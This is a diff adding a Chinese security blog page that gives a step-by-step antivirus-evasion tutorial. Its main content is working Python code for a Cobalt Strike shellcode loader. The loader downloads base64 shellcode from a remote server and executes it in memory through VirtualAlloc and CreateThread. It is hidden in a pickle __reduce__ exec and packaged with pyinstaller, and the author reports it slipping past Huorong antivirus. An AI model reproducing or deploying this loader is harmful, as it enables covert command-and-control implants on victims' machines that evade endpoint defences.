@@ -1,0 +1,185 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title> - Sec H</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="渗透测试,"> 
+    <meta name="description" content="思路来源：1https:&amp;#x2F;&amp;#x2F;www.sec-in.com&amp;#x2F;article&amp;#x2F;733
+步骤1.先用CS生成一个python的payload:2.将生成的paylo,"> 
+    <meta name="author" content="Sec H"> 
+    <link rel="alternative" href="atom.xml" title="Sec H" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Sec H</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://givemefivw.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle"></h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title"></h1>
+        <div class="stuff">
+            <span>十二月 23, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="思路来源："><a href="#思路来源：" class="headerlink" title="思路来源："></a>思路来源：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.sec-in.com&#x2F;article&#x2F;733</span><br></pre></td></tr></table></figure>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1.先用CS生成一个python的payload:<br><img src="/2020/12/23/bypassav/1.png"><br>2.将生成的payload打开，复制里面的shellcode，对shellcode进行base64编码<br><img src="/2020/12/23/bypassav/2.png"><br>3.将编码后的shellcode放入服务器目录下，访问<br><img src="/2020/12/23/bypassav/3.png"><br>出现shellcode即证明正常。<br>4.将地址复制下来，粘贴到下方代码中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;&quot;&quot;</span><br><span class="line">import ctypes,urllib.request,codecs,base64</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;host&#x2F;test.txt&#39;).read()</span><br><span class="line">shellcode &#x3D; base64.b64decode(shellcode)</span><br><span class="line">shellcode &#x3D;codecs.escape_decode(shellcode)[0]</span><br><span class="line">shellcode &#x3D; bytearray(shellcode)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line"># 放入shellcode</span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="line">handle &#x3D; ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="line">)</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec, (shellcode,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret &#x3D; pickle.dumps(A())</span><br><span class="line">ret_base64 &#x3D; base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br><span class="line">#ret_decode &#x3D; base64.b64decode(ret_base64)</span><br></pre></td></tr></table></figure>
+<p>运行此脚本，不出意外的话会得到以下数据：<br><img src="/2020/12/23/bypassav/4.png"><br>5.接下来，再把刚才得到的数据粘贴到如下代码中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64,pickle,ctypes,urllib.request</span><br><span class="line">shellcode &#x3D; b&#39;gANjYnVpbHRpbnMKZXhlYwpxAFgxBAAACmltcG9ydCBjdHlwZXMsdXJsbGliLnJlcXVlc3QsY29kZWNzLGJhc2U2NAoKc2hlbGxjb2RlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovLzguMTMxLjc5LjE2Ni90ZXN0LnR4dCcpLnJlYWQoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCnNoZWxsY29kZSA9IGJ5dGVhcnJheShzaGVsbGNvZGUpCbypassav6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQoKIyDmlL7lhaVzaGVsbGNvZGUKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCbypassav5Yib5bu65LiA5Liq57q&#x2F;56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i&#x2F;kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSlxAYVxAlJxAy4&#x3D;&#39;</span><br><span class="line">pickle.loads(base64.b64decode(shellcode))</span><br></pre></td></tr></table></figure>
+<p>6.在Windows机器中运行此脚本<br><img src="/2020/12/23/bypassav/5.png"><br>此时再看CS，成功上线！<br><img src="/2020/12/23/bypassav/6.png"><br>7.用pyinstaller将此脚本生成exe文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F 2.py</span><br></pre></td></tr></table></figure>
+<p>看着确实有点大。。。<br><img src="/2020/12/23/bypassav/7.png"><br>再看CS<br><img src="/2020/12/23/bypassav/8.png"><br>看下后台进程<br><img src="/2020/12/23/bypassav/9.png"><br>这时是开着火绒的，完美过了！</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%9D%A5%E6%BA%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">思路来源：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">步骤</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
